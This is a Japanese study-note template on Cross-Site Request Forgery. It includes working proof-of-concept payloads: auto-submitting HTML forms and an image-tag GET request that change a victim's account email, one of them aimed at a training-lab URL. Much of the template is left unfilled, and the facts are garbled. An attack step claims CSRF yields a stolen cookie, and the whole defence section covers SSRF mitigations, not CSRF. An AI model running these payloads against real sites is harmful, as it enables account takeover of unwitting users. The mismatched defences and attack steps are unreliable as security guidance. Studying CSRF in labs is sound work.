# 脆弱性名: [Cross site Request Forgery (CSRF)]  

## 1️ 概要 / 定義
- クロスサイトリクエストフォージュリーは、攻撃者がユーザに意図しない操作を実行させることを可能にするウェブセキュリティの脆弱性。

## 2️ 攻撃の前提条件
- [関連するアクション]
	- 攻撃者がアプリケーション内で何らかのアクションを誘発する必要がある。
		- 特権での操作や自身のパスワード変更等
- [Cookieベースのセッション処理]
	- アクションの実行には1つ以上HTTPリクエスト発行が含まれアプリケーションはリクエストを送信したユーザを識別するために必要。
- [予測不可能なリクエストパラメータがないこと]
	- 攻撃者がすべてのパラメータの値を知っている必要がある。
		- CSRFにならない場合:これはパスワード変更であった場合、現在のパスワードを知らないとリクエストが処理されてないためそもそもCSRFの対象にはならないという話。
		- CSRFになる場合:

## 3️ 影響
- Webアプリでそのアカウントで許可されている操作はできてしまう。

## 4️ 何ができるか（攻撃成功時の具体例）
- 取得したユーザの権限によって変わる。

## 5️ 攻撃フロー（手順化）
1. [ステップ1：攻撃者がWebページを作成する。]
```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
1. [ステップ2：ユーザに1で作成したページを踏ませる。]
2. [ステップ3：1で仕込んだメールアドレスに変更できていればOK]
3. [ステップ4 : 盗んだクッキーを使用してログインする。]
- **目的は「どうすれば成功するか」を他人に説明できるように書くこと**

## 6️ 検出方法（診断手法）
- 手動：
  - [具体的にどのツールを使い、どう検証するか]
- 自動：
  - PoC作成をしてくれるツール
	  - https://github.com/0xInfection/CSRFPocGenerator.git
  - [どういう設定や条件で検出できるか]

## 7️ 判定基準
- [何をもって脆弱と判定するか]
- [ガイドライン（OWASP、CWEなど）や一般的な基準に照らして明文化]
- 例：認証なしで閲覧可能 / 特定操作が実行可能 / トークンがない 等

## 8️ 防御策 / 緩和策
- 技術的対策：
  - [ネットワーク層]
	  - リモートリソースアクセス機能を別々のネットワークに分割する。
	  - 「デフォルトで拒否」のFWポリシーで拒否または、ネットワークアクセス制御ルールを適用し、必須のイントラネットトラフィック以外はすべてブロック。
  - [アプリケーション]
	  - クライアントが提供するすべての入力をサニタイズして検証
	  - URLスキーマ、ポート、および宛先をホワイトリストで強制する。
	  - クライアントに生の応答を送信しない。
	  - HTTPリダイレクトを無効にする。
	  - DNS理バインディングやTOCTOU競合状態などの攻撃を回避するためにURLの一貫性に注意する。
- OWASPなどの対策
	- https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
	- https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

## 9 Payload
```
▼Getの場合
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">

▼Postの場合
<form method="POST" action="https://0a47002104cc99ee801e039900c40056.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf2@web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

---
## 【補足】理解すべき背景
- なぜこの脆弱性が成立するのか：
  - [仕様上、設計上、実装上、どの要素が原因か]
- よくある失敗事例：
  - [実際に企業や現場でありがちなミス]
- 関連する脆弱性・攻撃手法：
  - [他の脆弱性との関連性]